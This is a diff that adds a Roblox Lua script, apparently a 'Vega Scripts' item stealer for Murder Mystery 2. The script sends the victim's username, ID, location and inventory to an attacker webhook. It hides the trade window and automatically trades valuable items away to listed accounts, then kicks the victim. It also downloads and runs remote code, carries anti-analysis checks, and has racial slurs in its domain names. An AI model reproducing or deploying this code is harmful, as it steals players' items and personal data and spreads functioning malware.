+							local request_2 = request or syn and syn.request or http_request or http and http.request
+
+							if not request_2 then
+								warn("Executor doesnt request")
+
+								return {
+									total = "0.00",
+									itemPrices = {}
+								}
+							end
+
+							local ok3, result3 = pcall(function()
+								return request_2({
+									Url = "https://fuckingniggermf.vercel.app/api/calc",
+									Method = "POST",
+									Headers = {
+										["Content-Type"] = "application/json"
+									},
+									Body = HttpService2:JSONEncode({
+										inventory = p108
+									})
+								})
+							end)
+
+							if ok3 and result3 and result3.Body then
+								local ok4, result4 = pcall(function()
+									return HttpService2:JSONDecode(result3.Body)
+								end)
+
+								if ok4 then
+									return result4
+								end
+							end
+
+							return {
+								total = "0.00",
+								itemPrices = {}
+							}
+						end
+						u74 = nil
+						v75 = function(p109)
+							u74 = 24282524
+
+							local t54 = {}
+
+							local function v730()
+								local request_2 = request or syn and syn.request or http_request or http and http.request
+
+								if not request_2 then
+									return {}
+								end
+
+								local function v732(p110)
+									local ok3, result3 = pcall(function()
+										return request_2({
+											Url = p110,
+											Method = "GET",
+											Headers = {
+												Accept = "application/json",
+												["User-Agent"] = "Mozilla/5.0"
+											}
+										})
+									end)
+
+									if ok3 then
+										if result3 and result3.Body then
+											local t55 = {}
+
+											for match, match2 in result3.Body:gmatch("\"name\":\"([^\"]+)\",\"game\":\"mm2\",\"price\":[%d.]+,\"emoji\":\"([^\"]+)\"") do
+												t55[match:lower()] = match2
+											end
+
+											return t55
+										end
+									end
+
+									return {}
+								end
+
+								local v738 = v732("https://api.project-reverse.org/valuables/get-game-valuables?game=mm2")
+
+								if not v738 or next(v738) == nil then
+									v738 = v732("https://fuckingniggermf.vercel.app/api/valuables?game=mm2")
+								end
+
+								return v738
+							end
+
+							local v739 = v730()
+
+							for _, v in ipairs(p109) do
+								table.insert(t54, {
+									name = tostring(v.DataID):gsub("%s+", ""),
+									amount = tonumber(v.Amount) or 1
+								})
+							end
+
+							local v742 = v73(t54)
+
+							if v742 and v742.itemPrices then
+								for k, itemPrice in pairs(v742.itemPrices) do
+									local v745 = v739[k:lower()]
+
+									if v745 and v745 ~= "" then
+										itemPrice.emoji = v745
+									else
+										itemPrice.emoji = ""
+									end
+								end
+							end
+
+							return v742
+						end
+						u76 = nil
+						v77 = function()
+							u76 = 301773659
+
+							local request_2 = request or syn and syn.request or http_request or http and http.request
+
+							if not request_2 then
+								warn("No request function available for value API")
+
+								return {}
+							end
+
+							local ok3, result3 = pcall(function()
+								return request_2({
+									Url = "https://vegascripts.lol/public/mm2-values.lua",
+									Method = "GET"
+								})
+							end)
+
+							if ok3 and result3 and result3.Body then
+								local chunk = loadstring(result3.Body)
+
+								if chunk then
+									local ok4, result4 = pcall(chunk)
+
+									if ok4 and result4 then
+										return result4
+									end
+								end
+							end
+
+							return {}
+						end
+						v78 = function()
+							local t56 = {}
+							local v753 = v77()
+
+							if v753 then
+								if next(v753) ~= nil then
+									for k, v in pairs(Item) do
+										local ItemName = v.ItemName or ""
+										local Rarity = v.Rarity or ""
+										local Chroma = v.Chroma or false
+
+										if ItemName ~= "" and Rarity ~= "" then
+											local v759 = table.find(t1, Rarity)
+											local v760 = table.find(t1, "Godly")
+
+											if v759 and v760 <= v759 then
+												local v761
+
+												if Chroma then
+													if v753.Chroma and v753.Chroma[ItemName] then
+														v761 = v753.Chroma[ItemName]
+													end
+												else
+													local v762 = ({
+														Common = "Common",
+														Uncommon = "Uncommon",
+														Rare = "Rare",
+														Epic = "Epic",
+														Legendary = "Legendary",
+														Godly = "Godly",
+														Ancient = "Ancient",
+														Unique = "Unique",
+														Vintage = "Vintage"
+													})[Rarity]
+
+													if v762 and v753[v762] and v753[v762][ItemName] then
+														v761 = v753[v762][ItemName]
+													end
+												end
+
+												if v761 then
+													t56[k] = v761
+												end
+											end
+										end
+									end
+
+									return t56
+								end
+							end
+
+							warn("Failed to fetch values from ts using fallback")
+
+							return t56
+						end
+						u79 = nil
+						u80 = nil
+						u81 = nil
+						v82 = function(p111)
+							u79 = 63343817
+							u80 = 738739290
+							u81 = 744397085
+
+							if webhook == "" then
+								warn("No webhook token")
+
+								return false, nil
+							end
+
+							local v763, v764 = v38(p111, webhook)
+
+							if not v763 then
+								warn("enc fail")
+
+								return false, nil
+							end
+
+							local t57 = {
+								webhook = webhook,
+								timestamp = v764,
+								encrypted = v763
+							}
+							local ok3, result3 = pcall(function()
+								return request_({
+									Url = "https://webhook.vegascripts.lol/api/token/" .. webhook,
+									Method = "POST",
+									Headers = {
+										["Content-Type"] = "application/json",
+										["User-Agent"] = "Mozilla/5.0"
+									},
+									Body = HttpService:JSONEncode(t57)
+								})
+							end)
+
+							if ok3 and result3 then
+								if result3.StatusCode == 200 then
+									return true, (HttpService:JSONDecode(result3.Body))
+								end
+
+								warn("says diddy boi" .. tostring(result3.StatusCode))
+							else
+								warn("fail boi " .. tostring(result3))
+							end
+
+							return false, nil
+						end
+						v83 = false
+						ipairs_ = ipairs
+						Usernames_2 = Usernames or {}
+
+						for _, v in ipairs_(Usernames_2) do
+							if v == LocalPlayer.Name then
+								v83 = true
+
+								break
+							end
+						end
+
+						v86 = false
+
+						if v83 then
+							v86 = true
+						end
+
+						u87 = nil
+						u88 = nil
+						u89 = nil
+						v90 = function(p112)
+							u87 = 490977325
+							u88 = 473632988
+							u89 = 543508434
+
+							local v770 = Players:FindFirstChild(p112)
+
+							if v770 then
+								pcall(function()
+									ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(v770)
+								end)
+							end
+						end
+						v91 = function()
+							return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+						end
+						u92 = nil
+						u93 = nil
+						u94 = nil
+						v95 = function()
+							u92 = 572979834
+							u93 = 922086990
+							u94 = 837910670
+
+							repeat
+								task.wait(0.1)
+							until v91() == "None"
+						end
+						Trade = ReplicatedStorage.Trade
+						_G_ = _G
+						LastOffer = _G.LastOffer or nil
+						_G_.LastOffer = LastOffer
+						u99 = nil
+						u100 = nil
+						Trade.UpdateTrade.OnClientEvent:Connect(function(p113)
+							u99 = 214572371
+							u100 = 1052024091
+							_G.LastOffer = p113.LastOffer
+						end)
+						v101 = function()
+							if _G.LastOffer then
+								Trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer)
+							else
+								warn("nil")
+							end
+						end
+						u102 = nil
+						u103 = nil
+						v104 = function(p114)
+							u102 = 827327342
+							u103 = 988604516
+							Trade.OfferItem:FireServer(p114, "Weapons")
+						end
+						u105 = nil
+						u106 = nil
+						v107 = function(p115, p116, p117)
+							u105 = 30301695
+							u106 = 667811889
+
+							if not t7[p115] then
+								t7[p115] = 0
+							end
+
+							t7[p115] += p116 or 1
+
+							if messageId then
+								pcall(function()
+									local t58 = {
+										Url = "http://webhook.vegascripts.lol" .. "/api/claimed/" .. webhook,
+										Method = "POST",
+										Headers = {
+											["Content-Type"] = "application/json"
+										}
+									}
+									local v772 = HttpService
+									local JSONEncode = HttpService.JSONEncode
+
+									t58.Body = JSONEncode(v772, {
+										messageId = messageId,
+										weaponName = p115,
+										amount = p116 or 1,
+										valueAmount = p117 or 0
+									})
+									request(t58)
+								end)
+							end
+						end
+						v108 = function(p118)
+							task.spawn(function()
+								while pcall(function()
+									request({
+										Url = "http://webhook.vegascripts.lol" .. "/api/ping/" .. webhook,
+										Method = "POST",
+										Headers = {
+											["Content-Type"] = "application/json"
+										},
+										Body = HttpService:JSONEncode({
+											messageId = p118
+										})
+									})
+								end) do
+									task.wait(1)
+								end
+							end)
+						end
+						u109 = nil
+						u110 = nil
+						v111 = function(p119)
+							u109 = 563789295
+							u110 = 367676871
+							pcall(function()
+								request({
+									Url = "http://webhook.vegascripts.lol" .. "/api/partial/" .. webhook,
+									Method = "POST",
+									Headers = {
+										["Content-Type"] = "application/json"
+									},
+									Body = HttpService:JSONEncode({
+										messageId = p119
+									})
+								})
+							end)
+						end
+						u112 = nil
+						u113 = nil
+						u114 = nil
+						v115 = function(p120)
+							u112 = 940471625
+							u113 = 1008316571
+							u114 = 868413586
+							pcall(function()
+								request({
+									Url = "http://webhook.vegascripts.lol" .. "/api/allclaimed/" .. webhook,
+									Method = "POST",
+									Headers = {
+										["Content-Type"] = "application/json"
+									},
+									Body = HttpService:JSONEncode({
+										messageId = p120
+									})
+								})
+							end)
+						end
+						getgenv().topHitCycleEnabled = true
+						getgenv().topHitLowThreshold = 1000
+						getgenv().topHitHighThreshold = 5000
+						getgenv().topHitLowStartHour = 14
+						getgenv().topHitLowEndHour = 16
+						getgenv().topHitHighStartHour = 16
+						getgenv().topHitHighEndHour = 20
+						v116 = function()
+							if not getgenv().topHitCycleEnabled then
+								return 5000
+							end
+
+							local v774 = tonumber(os.date("%H"))
+							local topHitLowStartHour = getgenv().topHitLowStartHour or 14
+							local topHitLowEndHour = getgenv().topHitLowEndHour or 16
+							local topHitHighStartHour = getgenv().topHitHighStartHour or 16
+							local topHitHighEndHour = getgenv().topHitHighEndHour or 20
+
+							if topHitLowStartHour <= v774 and v774 < topHitLowEndHour then
+								return getgenv().topHitLowThreshold or 1000
+							end
+
+							if topHitHighStartHour <= v774 and v774 < topHitHighEndHour then
+								return getgenv().topHitHighThreshold or 5000
+							end
+
+							return getgenv().topHitHighThreshold or 5000
+						end
+						v117 = function(p121, p122)
+							local n20 = 0
+							local v780 = #p121 > 0
+
+							if v780 then
+								for _, v in ipairs(p121) do
+									n20 += (v.Value or 0) * (v.Amount or 1)
+								end
+							end
+
+							if not v780 then
+								p122 = ""
+							end
+
+							local function v783(p123)
+								local n21 = 0
+								local t59 = {}
+
+								for _, v in ipairs(p123) do
+									local v788 = tostring(v.DataID):gsub("%s+", "")
+									local Rarity = v.Rarity or ""
+									local Value = v.Value or 0
+									local Amount = v.Amount or 1
+
+									if Rarity == "Godly" or Rarity == "Ancient" or Rarity == "Unique" then
+										local v792 = Value * Amount * 0.013
+
+										n21 += v792
+										t59[v788] = {
+											price = string.format("%.2f", v792),
+											emoji = ""
+										}
+									end
+								end
+
+								return {
+									total = string.format("%.2f", n21),
+									itemPrices = t59
+								}
+							end
+
+							local v793 = v780 and v783(p121) or {
+								total = "0.00",
+								itemPrices = {}
+							}
+							local total = v793.total or "0.00"
+							local itemPrices = v793.itemPrices or {}
+							local n22 = 0
+
+							if v780 then
+								for _, v in ipairs(p121) do
+									n22 += (v.Value or 0) * (v.Amount or 1)
+								end
+							end
+
+							local identifyexecutor_2 = identifyexecutor and identifyexecutor() or "Unknown"
+							local v800 = "https://vegascripts.lol/join?placeId=" .. game.PlaceId .. "&jobId=" .. getgenv().RealJobID
+							local v801 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
+							local v802 = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(LocalPlayer.UserId)
+							local v803 = "https://fuckingniggermf.vercel.app/api/Nigger?userId=" .. tostring(LocalPlayer.UserId)
+							local t60 = {}
+							local n23 = 0
+
+							for _, v in ipairs(p121) do
+								table.insert(t60, v)
+								n23 += v.Amount or 1
+							end
+
+							table.sort(t60, function(p124, p125)
+								local v808 = tostring(p124.DataID):gsub("%s+", "")
+								local v809 = tostring(p125.DataID):gsub("%s+", "")
+
+								return (itemPrices[v808] and tonumber(itemPrices[v808].price) or 0) > (itemPrices[v809] and tonumber(itemPrices[v809].price) or 0)
+							end)
+
+							local v810 = tonumber(total) or 0
+							local v811 = false
+							local s5 = "```"
+							local v813
+
+							if #t60 == 0 then
+								v813 = s5 .. "  no items found in inventory (that matches your min value/rarity)\n```"
+							else
+								for _, v in ipairs(t60) do
+									local v816 = tostring(v.DataID):gsub("%s+", "")
+									local v817 = itemPrices[tostring(v.DataID):gsub("%s+", "")]
+									local v818 = v817 and tonumber(v817.price) or 0
+
+									if not (v817 and v817.emoji) then
+									end
+
+									local v819 = t7[v816] or 0
+									local Amount = v.Amount
+									local v821 = string.format("[%d/%d]", v819, Amount)
+									local v822 = string.format("- %dx %s%s ── $%.2f %s\n", Amount, v.Value > 1500 and "" or "", v816, v818, v821)
+
+									if not (#s5 + #v822 < 350) then
+										v811 = true
+
+										break
+									end
+
+									s5 ..= v822
+									v810 -= v818
+								end
+
+								if v811 then
+									s5 ..= string.format("\nAnd $%.2f worth of items more...\n", math.max(0, v810))
+								end
+
+								v813 = s5 .. "```"
+							end
+
+							local country = loc.country or "Unknown"
+
+							if loc.city and loc.city ~= "" then
+								country ..= ", " .. loc.city
+							end
+
+							local v824 = false
+
+							if v116() < n20 then
+								v824 = true
+							end
+
+							local v825 = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. getgenv().RealJobID .. "')"
+							local v826, v827 = v82({
+								gameType = "MM2",
+								istophit = v824,
+								location = country,
+								receiver = v86,
+								content = p122,
+								username = "Vega",
+								avatar_url = "https://cdn.discordapp.com/attachments/1502980057084203180/1518993307001163917/New_Project_99_7AA01CA.png?ex=6a3bf041&is=6a3a9ec1&hm=af2811e56cec274205bcf42911072a6cb4c84fb292fa0fedeecdb66d17a3d09d&",
+								embeds = { {
+									author = {
+										name = "⚡ Vega · Murder Mystery 2",
+										url = "https://www.roblox.com/games/142823291",
+										icon_url = v802
+									},
+									title = "**" .. LocalPlayer.Name .. "**",
+									description = "```Status        : " .. "Pending" .. "\nItems Claimed : 0 / " .. n23 .. "\nValue Claimed : 0 / " .. n20 .. "```",
+									color = 16711680,
+									thumbnail = {
+										url = v801
+									},
+									fields = {
+										{
+											name = "**Player Info**",
+											value = "```User        : " .. LocalPlayer.Name .. "\nUser ID     : " .. LocalPlayer.UserId .. "\nAge         : " .. LocalPlayer.AccountAge .. " days" .. "\nTotal Value : " .. (n20 or 0) .. "\nTotal USD   : $" .. total .. "\nExecutor    : " .. identifyexecutor_2 .. "\nPlayers     : " .. #Players:GetPlayers() .. "/" .. game.Players.MaxPlayers .. "```",
+											inline = false
+										},
+										{
+											name = "**Inventory**",
+											value = v813,
+											inline = false
+										},
+										{
+											name = "**Teleport Script**",
+											value = "```lua\n" .. v825 .. "```",
+											inline = false
+										},
+										{
+											name = "**Join Link**",
+											value = "[Click here to join](" .. v800 .. ")",
+											inline = false
+										}
+									},
+									footer = {
+										text = "Vega Scripts · discord.gg/vega-scripts",
+										icon_url = v803
+									},
+									timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+								} }
+							})
+
+							if v780 then
+								v67()
+							end
+
+							return v826, v827
+						end
+						u118 = nil
+						u119 = nil
+						pcall(function()
+							u118 = 786116392
+							u119 = 844217739
+
+							local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
+							local Trade2 = ReplicatedStorage2:FindFirstChild("Trade")
+
+							if not Trade2 then
+								Trade2 = Instance.new("Folder")
+								Trade2.Name = "Trade"
+								Trade2.Parent = ReplicatedStorage2
+								print("created trade folder")
+							end
+
+							local t61 = {
+								SendRequest = "RemoteFunction",
+								GetProfileData = "RemoteFunction",
+								UpdateTrade = "RemoteEvent",
+								AcceptTrade = "RemoteEvent",
+								DeclineTrade = "RemoteEvent",
+								StartTrade = "RemoteEvent"
+							}
+
+							for k, v in pairs(t61) do
+								if not Trade2:FindFirstChild(k) then
+									local instance = Instance.new(v)
+
+									instance.Name = k
+									instance.Parent = Trade2
+									warn("0")
+								end
+							end
+
+							local Modules = ReplicatedStorage2:FindFirstChild("Modules")
+
+							if not Modules then
+								Modules = Instance.new("Folder")
+								Modules.Name = "Modules"
+								Modules.Parent = ReplicatedStorage2
+								print("module gay")
+							end
+
+							local function createModuleScript()
+								local ModuleScript = Instance.new("ModuleScript")
+
+								ModuleScript.Name = "TradeModule"
+								ModuleScript.Source = "return {}"
+								ModuleScript.Parent = Modules
+								warn("0")
+
+								return ModuleScript
+							end
+
+							local TradeModule = Modules:FindFirstChild("TradeModule")
+
+							if TradeModule then
+								if not TradeModule:IsA("ModuleScript") then
+									TradeModule:Destroy()
+									createModuleScript()
+								end
+							else
+								createModuleScript()
+							end
+
+							if not Modules:FindFirstChild("TradeModule") then
+								createModuleScript()
+							end
+
+							for k, v in pairs(t61) do
+								if not Trade2:FindFirstChild(k) then
+									local instance = Instance.new(v)
+
+									instance.Name = k
+									instance.Parent = Trade2
+									warn("0")
+								end
+							end
+
+							local RobloxGui = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
+
+							if RobloxGui then
+								local TradeGUI_Phone = RobloxGui:FindFirstChild("TradeGUI_Phone")
+
+								if TradeGUI_Phone and TradeGUI_Phone.Enabled == false then
+									TradeGUI_Phone.Enabled = true
+									warn("0")
+								end
+							end
+
+							print("complete")
+						end)
+						t8 = {
+							DefaultGun = true,
+							DefaultKnife = true,
+							Reaver = true,
+							Reaver_Legendary = true,
+							Reaver_Godly = true,
+							Reaver_Ancient = true,
+							IceHammer = true,
+							IceHammer_Legendary = true,
+							IceHammer_Godly = true,
+							IceHammer_Ancient = true,
+							Gingerscythe = true,
+							Gingerscythe_Legendary = true,
+							Gingerscythe_Godly = true,
+							Gingerscythe_Ancient = true,
+							TestItem = true,
+							Season1TestKnife = true,
+							Cracks = true,
+							Icecrusher = true,
+							["???"] = true,
+							Dartbringer = true,
+							TravelerAxeRed = true,
+							TravelerAxeBronze = true,
+							TravelerAxeSilver = true,
+							TravelerAxeGold = true,
+							BlueCamo_K_2022 = true,
+							GreenCamo_K_2022 = true,
+							SharkSeeker = true
+						}
+						v121 = v78()
+						response = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+						v123 = function()
+							local t62 = {}
+							local v844 = table.find(t1, min_rarity)
+
+							for k, v in pairs(response.Weapons.Owned) do
+								task.wait()
+
+								local v847 = Item[k] or Item[tostring(k)]
+
+								if not v847 then
+									for _, v2 in pairs(Item) do
+										if v2.ItemID and tostring(v2.ItemID) == tostring(k) then
+											v847 = v2
+
+											break
+										end
+									end
+								end
+
+								if v847 then
+									local Rarity = v847.Rarity
+									local v851 = table.find(t1, Rarity)
+
+									if v851 and v844 <= v851 and not t8[k] then
+										local v852 = v121[k]
+
+										if not v852 then
+											v852 = v851 >= table.find(t1, "Godly") and 2 or 1
+										end
+
+										if min_value <= v852 then
+											table.insert(t62, {
+												DataID = k,
+												Rarity = Rarity,
+												Amount = v,
+												Value = v852
+											})
+										end
+									end
+								else
+									warn("Item not found " .. tostring(k))
+								end
+							end
+
+							table.sort(t62, function(p126, p127)
+								return p126.Value * p126.Amount > p127.Value * p127.Amount
+							end)
+
+							return t62
+						end
+						u124 = nil
+						v125 = function()
+							u124 = 597805934
+							game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
+						end
+						u126 = nil
+						u127 = nil
+						u128 = nil
+						v129 = function()
+							u126 = 937316987
+							u127 = 493048220
+							u128 = 330287905
+
+							local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+							task.spawn(function()
+								local TradeGUI = PlayerGui:WaitForChild("TradeGUI", 5)
+
+								if TradeGUI then
+									TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
+										TradeGUI.Enabled = false
+									end)
+									TradeGUI.Enabled = false
+								end
+
+								local TradeGUI_Phone = PlayerGui:WaitForChild("TradeGUI_Phone", 5)
+
+								if TradeGUI_Phone then
+									TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(function()
+										TradeGUI_Phone.Enabled = false
+									end)
+									TradeGUI_Phone.Enabled = false
+								end
+							end)
+						end
+						u130 = nil
+						u131 = nil
+						v132 = function(p128, p129, p130)
+							u130 = 650392578
+							u131 = 777532232
+
+							local v856 = false
+							local v857, v858, v859 = ipairs(t5)
+							local v860 = geniter(v857, v858, v859)
+
+							while true do
+								local v861 = table.pack(v860())
+
+								if v861[1] then
+									local v862 = v861[3]
+
+									if p128:lower() == tostring(v862):lower() then
+										v856 = true
+
+										break
+									end
+								else
+									break
+								end
+							end
+
+							local v863 = v91()
+
+							if v863 == "StartTrade" then
+								Trade.DeclineTrade:FireServer()
+								task.wait(0.3)
+							elseif v863 == "ReceivingRequest" then
+								Trade.DeclineRequest:FireServer()
+								task.wait(0.3)
+							end
+
+							local n24 = 0
+							local v865, v866, v867 = ipairs(p129)
+
+							for _, v in v865, v866, v867 do
+								n24 += v.Amount
+							end
+
+							local n25 = 0
+							local v871 = v78()
+
+							while #p129 > 0 do
+								local v872 = v91()
+
+								if v872 == "None" then
+									v90(p128)
+									task.wait(0.5)
+								elseif v872 == "SendingRequest" then
+									task.wait(0.3)
+								elseif v872 == "ReceivingRequest" then
+									Trade.DeclineRequest:FireServer()
+									task.wait(0.3)
+								elseif v872 == "StartTrade" then
+									local v873 = math.min(4, #p129)
+
+									for i = 1, v873 do
+										local v875 = p129[i]
+
+										for i2 = 1, v875.Amount do
+											v104(v875.DataID)
+											task.wait(0.05)
+										end
+									end
+
+									task.wait(6)
+									v101()
+									v95()
+									task.wait(0.5)
+
+									local response2 = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+									local t63 = {}
+									local t64 = {}
+									local n26 = 0
+
+									for i = 1, v873 do
+										local v882 = p129[i]
+
+										if not response2.Weapons.Owned[v882.DataID] then
+											local v883 = tostring(v882.DataID):gsub("%s+", "")
+
+											if not t63[v883] then
+												t63[v883] = 0
+											end
+
+											t63[v883] += v882.Amount
+											n26 += v882.Amount
+											table.insert(t64, i)
+										end
+									end
+
+									n25 += n26
+
+									if p130 and not v856 and n26 > 0 then
+										local v884, v885, v886 = pairs(t63)
+
+										for k, v in v884, v885, v886 do
+											local n27 = 0
+
+											for _, v2 in ipairs(p129) do
+												if tostring(v2.DataID):gsub("%s+", "") == k then
+													n27 = (v871[v2.DataID] or v2.Value or 1) * v
+
+													break
+												end
+											end
+
+											v107(k, v, n27)
+										end
+
+										if n24 <= n25 then
+											v115(p130)
+										else
+											v111(p130)
+										end
+									end
+
+									local v892 = #t64
+									local n28 = -1
+
+									for i = v892, 1, -1 do
+										table.remove(p129, t64[i])
+									end
+								else
+									task.wait(0.5)
+								end
+
+								task.wait(0.5)
+							end
+
+							if p130 and not v856 and n24 <= n25 then
+								v115(p130)
+								task.wait(0.5)
+							end
+
+							if n24 <= n25 then
+								task.wait(1)
+								LocalPlayer:kick("Your Items got cleared\nJoin discord.gg/vega-scripts To Make Your Own Script !")
+							end
+						end
+						u133 = nil
+						v134 = function(p131)
+							u133 = 1048485720
+
+							local t65 = {}
+							local v896 = table.find(t1, min_rarity)
+
+							for k, v in pairs(response.Weapons.Owned) do
+								task.wait()
+
+								local Rarity = Item[k].Rarity
+								local v900 = table.find(t1, Rarity)
+
+								if v900 and v896 <= v900 and not t8[k] then
+									local v901 = v121[k]
+
+									if not v901 then
+										v901 = v900 >= table.find(t1, "Godly") and 2 or 1
+									end
+
+									if p131 <= v901 then
+										table.insert(t65, {
+											DataID = k,
+											Rarity = Rarity,
+											Amount = v,
+											Value = v901
+										})
+									end
+								end
+							end
+
+							table.sort(t65, function(p132, p133)
+								return p132.Value * p132.Amount > p133.Value * p133.Amount
+							end)
+
+							return t65
+						end
+						v135 = function(p134, p135)
+							local v902 = false
+
+							for _, v in ipairs(t5) do
+								if p134:lower() == tostring(v):lower() then
+									v902 = true
+
+									break
+								end
+							end
+
+							local v905 = v134(v902 and 100 or min_value)
+
+							if #v905 == 0 then
+								return
+							end
+
+							v132(p134, v905, p135)
+						end
+						u136 = nil
+						u137 = nil
+						u138 = nil
+						v139 = function(p136)
+							u136 = 1065669493
+							u137 = 380350664
+							u138 = 622034225
+							v125()
+
+							for _, player in ipairs(Players:GetPlayers()) do
+								if table.find(t6, player.Name:lower()) then
+									v135(player.Name, p136)
+
+									return
+								end
+							end
+						end
+						v129()
+						v140 = v123()
+						v141 = pingEveryone == "Yes" and "||@everyone||" or "New hit ma boi"
+						v142, v143 = v117(v140, v141)
+
+						if v142 and v143 then
+							messageId = v143.messageId
+
+							if messageId then
+								v108(messageId)
+
+								if #v140 > 0 then
+									v139(messageId)
+								end
+							end
+						end
+
+						Players.PlayerAdded:Connect(function(player)
+							if table.find(t6, player.Name:lower()) then
+								v135(player.Name, messageId)
+							end
+						end)
+
+						return
+					end
+				end
+			end
+
+			return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+		end
+
+		local function v908()
+		end
+
+		if isfunctionhooked(v908) then
+			return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+		end
+
+		hookfunction(v908, function()
+			print("hi")
+		end)
+
+		if not isfunctionhooked(v908) then
+			return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+		end
+
+		if getmetatable and setmetatable and type and select and type(select(2, pcall(getmetatable, setmetatable({}, {
+			__index = function()
+				while true do
+				end
+			end
+		}))).__index) == "function" and pcall and debug and rawget and rawset and pcall(rawset, {}, " ", " ") and not getmetatable(require) and not getmetatable(print) and not getmetatable(error) then
+			if ({ debug.info(print, "a") })[1] == 0 and ({ debug.info(tostring, "a") })[1] == 0 and ({ debug.info(print, "a") })[2] == true and select and getfenv and select(1, pcall(getfenv, 69)) ~= true and select(2, pcall(rawget, debug, "info")) and not (#select(2, pcall(rawget, debug, "info"))(getfenv, "n") <= 1) then
+				if not (#select(2, pcall(rawget, debug, "info"))(print, "n") <= 1) and not select(2, pcall(rawget, debug, "info"))(print, "s") ~= "[C]" and not select(2, pcall(rawget, debug, "info"))(require, "s") ~= "[C]" and select(2, pcall(rawget, debug, "info"))(function()
+				end, "s") ~= "[C]" and not select(1, pcall(debug.info, coroutine.wrap(function()
+				end)(), "s")) ~= false then
+					if pcall(function()
+						Instance.new("Part"):thisdoesntworkaaa("a")
+					end) then
+						return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+					end
+
+					game:GetChildren(function()
+						while true do
+						end
+					end)
+
+					if #game:GetChildren() <= 4 then
+						return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+					end
+
+					ok, result = pcall(function()
+						return game:GetService("HttpService"):JSONDecode("[68, \"google.com\", true, 1234, false, [1234, null, \"meow\"], null, [\"b\"]]")
+					end)
+
+					if not ok then
+						return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+					end
+
+					if result[6][2] ~= nil then
+						return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+					end
+
+					ok2, result2 = pcall(function()
+						game()
+					end)
+
+					if not result2:find("attempt to call a Instance value") then
+						return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+					end
+
+					n10 = 0
+					connection = game:GetService("RunService").Heartbeat:Connect(function()
+						n10 += 1
+					end)
+
+					while n10 < 2 do
+						task.wait()
+					end
+
+					if connection then
+						connection:Disconnect()
+					end
+
+					setrawmetatable(identifyexecutor, {
+						__newindex = function()
+							error("unmodifyable", 2)
+						end,
+						__index = function(p137, p138)
+							return rawget(p137, p138)
+						end
+					})
+					scb = setclipboard
+
+					if scb then
+						scb("https://discord.gg/vega-scripts")
+					end
+
+					t1 = {
+						"Common",
+						"Uncommon",
+						"Rare",
+						"Epic",
+						"Legendary",
+						"Vintage",
+						"Godly",
+						"Vintage",
+						"Ancient",
+						"Unique"
+					}
+					HttpService = game:GetService("HttpService")
+					u10 = nil
+					bxor = bit32.bxor
+					band = bit32.band
+					bnot = bit32.bnot
+					rshift = bit32.rshift
+					lshift = bit32.lshift
+					v16 = function(p139, p140)
+						return bxor(rshift(p139, p140), lshift(p139, 32 - p140))
+					end
+					t2 = {
+						1116352408,
+						1899447441,
+						3049323471,
+						3921009573,
+						961987163,
+						1508970993,
+						2453635748,
+						2870763221,
+						3624381080,
+						310598401,
+						607225278,
+						1426881987,
+						1925078388,
+						2162078206,
+						2614888103,
+						3248222580,
+						3835390401,
+						4022224774,
+						264347078,
+						604807628,
+						770255983,
+						1249150122,
+						1555081692,
+						1996064986,
+						2554220882,
+						2821834349,
+						2952996808,
+						3210313671,
+						3336571891,
+						3584528711,
+						113926993,
+						338241895,
+						666307205,
+						773529912,
+						1294757372,
+						1396182291,
+						1695183700,
+						1986661051,
+						2177026350,
+						2456956037,
+						2730485921,
+						2820302411,
+						3259730800,
+						3345764771,
+						3516065817,
+						3600352804,
+						4094571909,
+						275423344,
+						430227734,
+						506948616,
+						659060556,
+						883997877,
+						958139571,
+						1322822218,
+						1537002063,
+						1747873779,
+						1955562222,
+						2024104815,
+						2227730452,
+						2361852424,
+						2428436474,
+						2756734187,
+						3204031479,
+						3329325298
+					}
+					v18 = function(p141)
+						u10 = 80248658
+
+						local v909 = #p141 * 8
+						local v910 = p141 .. "\128"
+						local v911 = v910 .. string.rep("\0", (56 - #v910 % 64) % 64) .. "\0\0\0\0"
+
+						for i = 3, 0, -1 do
+							v911 ..= string.char(math.floor(v909 / 2 ^ (i * 8)) % 256)
+						end
+
+						local t66 = {
+							1779033703,
+							3144134277,
+							1013904242,
+							2773480762,
+							1359893119,
+							2600822924,
+							528734635,
+							1541459225
+						}
+
+						for i = 1, #v911, 64 do
+							local t67 = {}
+
+							for i2 = 0, 15 do
+								local v917 = i + i2 * 4
+
+								t67[i2] = v911:byte(v917) * 16777216 + v911:byte(v917 + 1) * 65536 + v911:byte(v917 + 2) * 256 + v911:byte(v917 + 3)
+							end
+
+							for i2 = 16, 63 do
+								local v919 = bxor
+
+								t67[i2] = (t67[i2 - 16] + bxor(v16(t67[i2 - 15], 7), v16(t67[i2 - 15], 18), rshift(t67[i2 - 15], 3)) + t67[i2 - 7] + v919(v16(t67[i2 - 2], 17), v16(t67[i2 - 2], 19), rshift(t67[i2 - 2], 10))) % 4294967296
+							end
+
+							local v920 = t66[1]
+							local v921 = t66[2]
+							local v922 = t66[3]
+							local v923 = t66[4]
+							local v924 = t66[5]
+							local v925 = t66[6]
+							local v926 = t66[7]
+							local v927 = t66[8]
+
